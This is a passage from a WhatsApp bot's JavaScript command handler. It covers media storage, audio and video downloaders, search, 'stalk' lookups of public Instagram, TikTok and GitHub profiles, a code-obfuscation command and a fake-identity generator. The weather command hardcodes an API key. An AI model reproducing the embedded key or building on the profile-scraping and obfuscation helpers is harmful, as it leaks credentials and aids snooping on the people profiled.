            "./XliconMedia/database/xeonvideo.json",
            JSON.stringify(VideoXeon)
          );
          fs.unlinkSync(delb);
          replygcXlicon(
            `Success Adding Video\nCheck by typing ${prefix}listvideo`
          );
        }
        break;
      case "delvideo":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Enter the video name");
          if (!VideoXeon.includes(q))
            return replygcXlicon("The name does not exist in the database");
          let wanu = VideoXeon.indexOf(q);
          VideoXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./XliconMedia/database/xeonvideo.json",
            JSON.stringify(VideoXeon)
          );
          fs.unlinkSync(`./XliconMedia/video/${q}.mp4`);
          replygcXlicon(`Success deleting video ${q}`);
        }
        break;
      case "listvideo":
        {
          let teks = "┌──⭓「 *Video List* 」\n│\n";
          for (let x of VideoXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`;
          replygcXlicon(teks);
        }
        break;
      case "addimage":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Whats the image name?");
          if (ImageXeon.includes(q))
            return replygcXlicon("The name is already in use");
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          ImageXeon.push(q);
          await fsx.copy(delb, `./XliconMedia/image/${q}.jpg`);
          fs.writeFileSync(
            "./XliconMedia/database/xeonimage.json",
            JSON.stringify(ImageXeon)
          );
          fs.unlinkSync(delb);
          replygcXlicon(
            `Success Adding Image\nCheck by typing ${prefix}listimage`
          );
        }
        break;
      case "delimage":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Enter the image name");
          if (!ImageXeon.includes(q))
            return replygcXlicon("The name does not exist in the database");
          let wanu = ImageXeon.indexOf(q);
          ImageXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./XliconMedia/database/xeonimage.json",
            JSON.stringify(ImageXeon)
          );
          fs.unlinkSync(`./XliconMedia/image/${q}.jpg`);
          replygcXlicon(`Success deleting image ${q}`);
        }
        break;
      case "listimage":
        {
          let teks = "┌──⭓「 *Image List* 」\n│\n";
          for (let x of ImageXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`;
          replygcXlicon(teks);
        }
        break;
      case "addsticker":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Whats the sticker name?");
          if (StickerXeon.includes(q))
            return replygcXlicon("The name is already in use");
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          StickerXeon.push(q);
          await fsx.copy(delb, `./XliconMedia/sticker/${q}.webp`);
          fs.writeFileSync(
            "./XliconMedia/database/xeonsticker.json",
            JSON.stringify(StickerXeon)
          );
          fs.unlinkSync(delb);
          replygcXlicon(
            `Success Adding Sticker\nCheck by typing ${prefix}liststicker`
          );
        }
        break;
      case "delsticker":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Enter the sticker name");
          if (!StickerXeon.includes(q))
            return replygcXlicon("The name does not exist in the database");
          let wanu = StickerXeon.indexOf(q);
          StickerXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./XliconMedia/database/xeonsticker.json",
            JSON.stringify(StickerXeon)
          );
          fs.unlinkSync(`./XliconMedia/sticker/${q}.webp`);
          replygcXlicon(`Success deleting sticker ${q}`);
        }
        break;
      case "liststicker":
        {
          let teks = "┌──⭓「 *Sticker List* 」\n│\n";
          for (let x of StickerXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`;
          replygcXlicon(teks);
        }
        break;
      case "addmsg":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!m.quoted)
            return replygcXlicon("Reply Message You Want To Save In Database");
          if (!text)
            return replygcXlicon(`Example : ${prefix + command} filename`);
          let msgs = global.db.data.database;
          if (text.toLowerCase() in msgs)
            return replygcXlicon(`'${text}' registered in the message list`);
          msgs[text.toLowerCase()] = quoted.fakeObj;
          replygcXlicon(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`);
        }
        break;
      case "getmsg":
        {
          if (!text)
            return replygcXlicon(
              `Example : ${
                prefix + command
              } file name\n\nView list of messages with ${prefix}listmsg`
            );
          let msgs = global.db.data.database;
          if (!(text.toLowerCase() in msgs))
            return replygcXlicon(`'${text}' not listed in the message list`);
          XliconBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true);
        }
        break;
      case "listmsg":
        {
          let msgs = JSON.parse(fs.readFileSync("./src/database.json"));
          let seplit = Object.entries(global.db.data.database).map(
            ([nama, isi]) => {
              return { nama, ...isi };
            }
          );
          let teks = " DATABASE LIST \n\n";
          for (let i of seplit) {
            teks += `${themeemoji} *Name :* ${
              i.nama
            }\n${themeemoji} *Type :* ${getContentType(i.message).replace(
              /Message/i,
              ""
            )}\n────────────────────────\n\n`;
          }
          replygcXlicon(teks);
        }
        break;
      case "delmsg":
      case "deletemsg":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let msgs = global.db.data.database;
          if (!(text.toLowerCase() in msgs))
            return replygcXlicon(`'${text}' not listed in the message list`);
          delete msgs[text.toLowerCase()];
          replygcXlicon(`Successfully deleted '${text}' from the message list`);
        }
        break;
      case "addvn":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Whats the audio name?");
          if (VoiceNoteXeon.includes(q))
            return replygcXlicon("The name is already in use");
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          VoiceNoteXeon.push(q);
          await fsx.copy(delb, `./XliconMedia/audio/${q}.mp3`);
          fs.writeFileSync(
            "./XliconMedia/database/isXliconMedia.json",
            JSON.stringify(VoiceNoteXeon)
          );
          fs.unlinkSync(delb);
          replygcXlicon(
            `Success Adding Audio\nCheck by typing ${prefix}listvn`
          );
        }
        break;
      case "delvn":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (args.length < 1) return replygcXlicon("Enter the vn name");
          if (!VoiceNoteXeon.includes(q))
            return replygcXlicon("The name does not exist in the database");
          let wanu = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./XliconMedia/database/isXliconMedia.json",
            JSON.stringify(VoiceNoteXeon)
          );
          fs.unlinkSync(`./XliconMedia/audio/${q}.mp3`);
          replygcXlicon(`Success deleting vn ${q}`);
        }
        break;
      case "listvn":
        {
          let teks = "┌──⭓「 *VN List* 」\n│\n";
          for (let x of VoiceNoteXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`;
          replygcXlicon(teks);
        }
        break;
      case "addzip":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1) return replygcXlicon(`What's the zip name?`);
          let teks = `${text}`;
          {
            if (ZipXeon.includes(teks))
              return replygcXlicon("This name is already in use");
            let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            ZipXeon.push(teks);
            await fsx.copy(delb, `./XliconMedia/zip/${teks}.zip`);
            fs.writeFileSync(
              "./XliconMedia/database/zip.json",
              JSON.stringify(ZipXeon)
            );
            fs.unlinkSync(delb);
            replygcXlicon(`Success Adding zip\nTo check type ${prefix}listzip`);
          }
        }
        break;
      case "delzip":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1)
            return replygcXlicon("Enter the text in the zip list");
          let teks = `${text}`;
          {
            if (!ZipXeon.includes(teks))
              return replygcXlicon("This name does not exist in the database");
            let wanu = ZipXeon.indexOf(teks);
            ZipXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./XliconMedia/database/zip.json",
              JSON.stringify(ZipXeon)
            );
            fs.unlinkSync(`./XliconMedia/zip/${teks}.zip`);
            replygcXlicon(`Successfully deleted zip ${teks}`);
          }
        }
        break;
      case "listzip":
        {
          let teksooooo = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let x of ZipXeon) {
            teksooooo += `│⭔ ${x}\n`;
          }
          teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`;
          replygcXlicon(teksooooo);
        }
        break;
      case "addapk":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1)
            return replygcXlicon("What is the name of the apk?");
          let teks = `${text}`;
          {
            if (ApkXeon.includes(teks))
              return replygcXlicon("This name is already in use");
            let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            apknye.push(teks);
            await fsx.copy(delb, `./XliconMedia/apk/${teks}.apk`);
            fs.writeFileSync(
              "./XliconMedia/database/apk.json",
              JSON.stringify(ApkXeon)
            );
            fs.unlinkSync(delb);
            replygcXlicon(
              `Successful Adding apk\nTo Check type ${prefix}listapk`
            );
          }
        }
        break;
      case "delapk":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1) return replygcXlicon("Name of the apk?");
          let teks = `${text}`;
          {
            if (!ApkXeon.includes(teks))
              return replygcXlicon("This name does not exist in the database");
            let wanu = ApkXeon.indexOf(teks);
            ApkXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./XliconMedia/database/apk.json",
              JSON.stringify(ApkXeon)
            );
            fs.unlinkSync(`./XliconMedia/apk/${teks}.apk`);
            replygcXlicon(`Successfully deleted Apk ${teks}`);
          }
        }
        break;
      case "listapk":
        {
          let teksoooooo = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let x of ApkXeon) {
            teksoooooo += `│⭔ ${x}\n`;
          }
          teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`;
          replygcXlicon(teksoooooo);
        }
        break;
      case "addpdf":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1)
            return replygcXlicon("What is the name of the pdf");
          let teks = `${text}`;
          {
            if (DocXeon.includes(teks))
              return replygcXlicon("This name is already in use");
            let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
            DocXeon.push(teks);
            await fsx.copy(delb, `./XliconMedia/doc/${teks}.pdf`);
            fs.writeFileSync(
              "./XliconMedia/database/doc.json",
              JSON.stringify(DocXeon)
            );
            fs.unlinkSync(delb);
            replygcXlicon(
              `Successful Adding Pdf\nTo check type ${prefix}listpdf`
            );
          }
        }
        break;
      case "delpdf":
        {
          if (!XeonTheCreator) return XliconStickOwner();

          if (args.length < 1) return replygcXlicon("Enter the name");
          let teks = `${text}`;
          {
            if (!DocXeon.includes(teks))
              return replygcXlicon("This name does not exist in the database");
            let wanu = DocXeon.indexOf(teks);
            DocXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./XliconMedia/database/doc.json",
              JSON.stringify(DocXeon)
            );
            fs.unlinkSync(`./XliconMedia/doc/${teks}.pdf`);
            replygcXlicon(`Successfully deleted pdf ${teks}`);
          }
        }
        break;
      case "listpdf":
        {
          let teksoooo = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let x of DocXeon) {
            teksoooo += `│⭔ ${x}\n`;
          }
          teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`;
          replygcXlicon(teksoooo);
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        XliconBotInc_dev = await getBuffer(
          `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
        );
        await XliconBotInc.sendMessage(
          m.chat,
          { audio: XliconBotInc_dev, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
        break;
      case "friend":
      case "searchfriend":
        {
          await XliconStickWait();
          let teman = pickRandom(xeonverifieduser);
          setTimeout(() => {}, 1000);
          setTimeout(() => {
            replygcXlicon("Managed to Get One Person");
          }, 5000);
          setTimeout(() => {
            XliconBotInc.sendMessage(
              from,
              { text: `Here @${teman.split("@")[0]}`, mentions: [teman] },
              { quoted: m }
            );
          }, 9000);
        }
        break;
      case "q":
      case "quoted":
        {
          if (!m.quoted) return replygcXlicon("Reply the Message!!");
          let xeonquotx = await XliconBotInc.serializeM(await m.getQuotedObj());
          if (!xeonquotx.quoted)
            return replygcXlicon(
              "The message you are replying to is not sent by the bot"
            );
          await xeonquotx.quoted.copyNForward(m.chat, true);
        }
        break;
      case "obfus":
      case "obfuscate":
        {
          if (!q)
            return replygcXlicon(
              `Example ${prefix + command} const xeonbot = require('baileys')`
            );
          let meg = await obfus(q);
          replygcXlicon(`Success
${meg.result}`);
        }
        break;
      case "style":
      case "styletext":
        {
          let { styletext } = require("./lib/scraper");
          if (!text) return replygcXlicon("Enter Query text!");
          let anu = await styletext(text);
          let teks = `Style Text From ${text}\n\n`;
          for (let i of anu) {
            teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`;
          }
          replygcXlicon(teks);
        }
        break;
      case "yts":
      case "ytsearch":
        {
          if (!text)
            return replygcXlicon(
              `Example : ${prefix + command} story wa anime`
            );
          let yts = require("yt-search");
          let search = await yts(text);
          let teks = "YouTube Search\n\n Result From " + text + "\n\n";
          let no = 1;
          for (let i of search.all) {
            teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${
              i.type
            }\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${
              i.title
            }\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${
              i.timestamp
            }\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${
              i.url
            }\n\n─────────────────\n\n`;
          }
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: search.all[0].thumbnail }, caption: teks },
            { quoted: m }
          );
        }
        break;
      case "play":
      case "song":
        {
          if (!text)
            return replygcXlicon(
              `Example : ${prefix + command} anime whatsapp status`
            );
          const xeonplaymp3 = require("./lib/ytdl");
          let yts = require("youtube-yts");
          let search = await yts(text);
          let anup3k = search.videos[0];
          const pl = await xeonplaymp3.mp3(anup3k.url);
          await XliconBotInc.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync(pl.path),
              fileName: anup3k.title + ".mp3",
              mimetype: "audio/mp4",
              ptt: true,
              contextInfo: {
                externalAdReply: {
                  title: anup3k.title,
                  body: botname,
                  thumbnail: await fetchBuffer(pl.meta.image),
                  sourceUrl: websitex,
                  mediaType: 2,
                  mediaUrl: anup3k.url,
                },
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(pl.path);
        }
        break;
      case "ytmp3":
      case "ytaudio":
        let xeonaudp3 = require("./lib/ytdl");
        if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text))
          return replygcXlicon(
            `Where's the yt link?\nExample: ${
              prefix + command
            } https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
          );
        let audio = await xeonaudp3.mp3(text);
        await XliconBotInc.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(audio.path),
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: {
              externalAdReply: {
                title: audio.meta.title,
                body: botname,
                thumbnail: await fetchBuffer(audio.meta.image),
                mediaType: 2,
                mediaUrl: text,
              },
            },
          },
          { quoted: m }
        );
        await fs.unlinkSync(audio.path);
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const xeonvidoh = require("./lib/ytdl");
          if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text))
            replygcXlicon(
              `Where is the link??\n\nExample : ${
                prefix + command
              } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
            );
          const vid = await xeonvidoh.mp4(text);
          const ytc = `
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`;
          await XliconBotInc.sendMessage(
            m.chat,
            {
              video: { url: vid.videoUrl },
              caption: ytc,
            },
            { quoted: m }
          );
        }
        break;
      case "git":
      case "gitclone":
        if (!args[0])
          return replygcXlicon(
            `Where is the link?\nExample :\n${prefix}${command} https://github.com/salmanytofficial/XLICON-MD`
          );
        if (!isUrl(args[0]))
          return replygcXlicon("Link invalid! Please provide a valid URL.");
        let regex1 =
          /(?:https|git)(?::\/\/|@)(www\.)?github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, , user, repo] = args[0].match(regex1) || [];
        if (!repo) {
          return replygcXlicon(
            "Invalid GitHub link format. Please double-check the provided link."
          );
        }
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers
          .get("content-disposition")
          .match(/attachment; filename=(.*)/)[1];
        XliconBotInc.sendMessage(
          m.chat,
          {
            document: { url: url },
            fileName: filename + ".zip",
            mimetype: "application/zip",
          },
          { quoted: m }
        ).catch((err) => replygcXlicon(mess.error));
        break;
      case "tiktok":
      case "tiktokvideo":
        {
          if (!args[0])
            return replygcXlicon(`Example : ${prefix + command} link`);
          await XliconStickWait();
          let resxeon = await fetch(
            `https://api.maher-zubair.tech/download/tiktok2?url=${args[0]}`
          );
          let jsonxeon = await resxeon.json();
          if (jsonxeon.status == "200" && jsonxeon.result.url.nowm) {
            XliconBotInc.sendMessage(
              from,
              {
                caption: `➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�`,
                video: { url: jsonxeon.result.url.nowm },
                fileName: "video.mp4",
                mimetype: "video/mp4",
              },
              { quoted: m }
            );
          } else {
            return replygcXlicon("Failed to get video. Try after a while...");
          }
        }
        break;
      case "tiktokaudio":
        {
          if (!q) return replygcXlicon(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replygcXlicon(`Link Invalid!!`);
          await XliconStickWait();
          let resxeon = await fetch(
            `https://api.maher-zubair.tech/download/tiktok2?url=${q}`
          );
          let jsonxeon = await resxeon.json();
          if (jsonxeon.status == "200" && jsonxeon.result.url.nowm) {
            XliconBotInc.sendMessage(
              from,
              {
                audio: { url: jsonxeon.result.url.audio },
                fileName: "tiktokaudio.mp3",
                mimetype: "video/mp4",
              },
              { quoted: m }
            );
          } else {
            return replygcXlicon("Failed to get audio. Try after a while...");
          }
        }

        break;
      case "google":
        {
          if (!q)
            return replygcXlicon(`Example : ${prefix + command} ${botname}`);
          await XliconStickWait();
          let google = require("google-it");
          google({ query: text }).then((res) => {
            let teks = `Google Search From : ${text}\n\n`;
            for (let g of res) {
              teks += `⭔ *Title* : ${g.title}\n`;
              teks += `⭔ *Description* : ${g.snippet}\n`;
              teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`;
            }
            replygcXlicon(teks);
          });
        }
        break;
      case "weather":
        {
          if (!text) return replygcXlicon("What location?");
          let city = text.split(" ")[0];
          let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${city}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
          );
          let textw = "";
          textw += `*🗺️Weather of  ${city}*\n\n`;
          textw += `*Weather:-* ${wdata.data.weather[0].main}\n`;
          textw += `*Description:-* ${wdata.data.weather[0].description}\n`;
          textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`;
          textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`;
          textw += `*Pressure:-* ${wdata.data.main.pressure}\n`;
          textw += `*Humidity:-* ${wdata.data.main.humidity}\n`;
          textw += `*Humidity:-* ${wdata.data.wind.speed}\n`;
          textw += `*Latitude:-* ${wdata.data.coord.lat}\n`;
          textw += `*Longitude:-* ${wdata.data.coord.lon}\n`;
          textw += `*Country:-* ${wdata.data.sys.country}\n`;

          XliconBotInc.sendMessage(
            m.chat,
            {
              text: textw,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "fb":
      case "facebook":
        {
          if (!args[0]) {
            return replygcXlicon(
              `Please send the link of a Facebook video\n\nEXAMPLE :\n*${
                prefix + command
              }* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`
            );
          }
          const urlRegex =
            /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
          if (!urlRegex.test(args[0])) {
            return replygcXlicon("Url invalid");
          }
          try {
            const result = await fg.fbdl(args[0]);
            const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
            const response = await fetch(result.videoUrl);
            const arrayBuffer = await response.arrayBuffer();
            const videoBuffer = Buffer.from(arrayBuffer);
            XliconBotInc.sendMessage(
              m.chat,
              { video: videoBuffer, caption: tex },
              { quoted: m }
            );
          } catch (error) {
            replygcXlicon("Maybe private video!");
          }
        }
        break;

      case "ytstalk":
        {
          if (!text) return replygcXlicon(`Channel Name?`);
          let res = await fetchJson(
            `https://api.maher-zubair.tech/stalk/ytchannel?q=${text}`
          );
          const dateString = res.result[0].channel_created;
          const date = new Date(dateString);

          const options = {
            year: "numeric",
            month: "long",
            day: "numeric",
          };

          const formattedDate = date.toLocaleDateString("en-US", options);
          let txt = `
┌──「 *YOUTUBE STALK* 
▢ *Channel Name:* ${res.result[0].channel_name}
▢ *Channel Created:* ${formattedDate}
▢ *ABOUT:* ${res.result[0].channel_about || "None"}
└────────────`;
          if (res.status == "200") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: { url: res.result[0].channel_picture.high.url },
                caption: txt,
              },
              { quoted: m }
            );
          } else {
            return replygcXlicon("No such channel exists...");
          }
        }

        break;
      case "tiktokstalk":
        {
          if (!text) return replygcXlicon(`Username? `);
          let res = await fetchJson(
            `https://api.maher-zubair.tech/stalk/tiktok?q=${text}`
          );
          let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖 Name:* ${res.result.name}
▢ *🔖 Username:* ${res.result.username}
▢ *👥 Followers:* ${res.result.followers}
▢ *🫂 Following:* ${res.result.following}
▢ *🩷 Likes:* ${res.result.likes}
▢ *📌 Bio:* ${res.result.bio}
▢ *🔗 Link* : https://tiktok.com/${res.result.username}
└────────────`;
          if (res.status == "200") {
            XliconBotInc.sendMessage(
              m.chat,
              { image: { url: res.result.profile }, caption: txt },
              { quoted: m }
            );
          } else {
            return replygcXlicon(
              "Either the profile is private or doesn't exist..."
            );
          }
        }

        break;
      case "igstalk":
        {
          if (!args[0])
            return replygcXlicon(
              `Enter Instagram Username\n\nExample: ${
                prefix + command
              } ahmmikun`
            );
          const fg = require("api-dylux");
          try {
            let res = await fg.igStalk(args[0]);
            let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, "")}
└────────────`;
            await XliconBotInc.sendMessage(
              m.chat,
              { image: { url: res.profilePic }, caption: te },
              { quoted: m }
            );
          } catch {
            replygcXlicon(
              `Couldn't find this user on *Instagram* or profile is *Private*.`
            );
          }
        }
        break;
      case "ghstalk":
      case "githubstalk":
        {
          if (!q)
            return replygcXlicon(
              `Example ${prefix + command} salmanytofficial`
            );
          await XliconStickWait();
          let githubstalk = require("./lib/scraper");
          aj = await githubstalk.githubstalk(`${q}`);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: { url: aj.profile_pic },
              caption: `*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}`,
            },
            { quoted: m }
          );
        }
        break;
      case "npmstalk":
        {
          if (!q) return replygcXlicon(`Example ${prefix + command} xeonapi`);
          await XliconStickWait();
          let npmstalk = require("./lib/scraper");
          eha = await npmstalk.npmstalk(q);
          replygcXlicon(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`);
        }
        break;
      case "ffstalk":
        {
          if (!q) return replygcXlicon(`Example ${prefix + command} 946716486`);
          await XliconStickWait();
          let ffstalk = require("./lib/scraper");
          eeh = await ffstalk.ffstalk(`${q}`);
          replygcXlicon(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`);
        }
        break;
      case "mlstalk":
        {
          if (!q)
            return replygcXlicon(`Example ${prefix + command} 530793138|8129`);
          await XliconStickWait();
          let mlstalk = require("./lib/scraper");
          let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1]);
          replygcXlicon(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`);
        }
        break;
      case "disguise":
      case "fakeinfo":
        {
          let res = await fetchJson(
            `https://api.maher-zubair.tech/misc/fakeinfo`
          );
          let txt = `*FAKE INFO*
 *Name*: ${res.result.results[0].name.title} ${res.result.results[0].name.first} ${res.result.results[0].name.last}
 *Phone No*: ${res.result.results[0].cell}
 *Date of Birth*: ${res.result.results[0].dob.date} 
 *Age*: ${res.result.results[0].dob.age} 
 *Gender*: ${res.result.results[0].gender}
 *Address*: ${res.result.results[0].location.street}, ${res.result.results[0].location.state}
 *Postal Code*: ${res.result.results[0].location.postcode}
 *Email*: ${res.result.results[0].email}
 *LOGINS*
 *UUID*: ${res.result.results[0].login.uuid}
 *Username*: ${res.result.results[0].login.username}
 *Passowrd*: ${res.result.results[0].login.password}
 *Md5*: ${res.result.results[0].login.md5}
 *SHA1*: ${res.result.results[0].login.sha1}
 *SHA256*: ${res.result.results[0].login.sha256}`;
          if (res.status == "200") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: { url: res.result.results[0].picture.large },
                caption: txt,
              },
              { quoted: m }
            );
          } else {
            return replygcXlicon("Failed to generate information...");
          }
        }
        break;
      case "spotify":
        {
          if (!text) return replygcXlicon(`*Please enter a song name*`);
          try {
            const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(
              text
            )}`;
            const response = await fetch(apiUrl);
            if (!response.ok) {
              console.log("Error searching for song:", response.statusText);
              return replygcXlicon("Error searching for song");
            }
            const data = await response.json();
            const coverimage = data.spty.results.thumbnail;
            const name = data.spty.results.title;
            const slink = data.spty.results.url;
            const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(
              text
            )}`;
            const audioResponse = await fetch(dlapi);
            if (!audioResponse.ok) {
              console.log("Error fetching audio:", audioResponse.statusText);
              return replygcXlicon("Error fetching audio");
            }
            const audioBuffer = await audioResponse.buffer();
            const tempDir = os.tmpdir();
            const audioFilePath = path.join(tempDir, "audio.mp3");
            try {
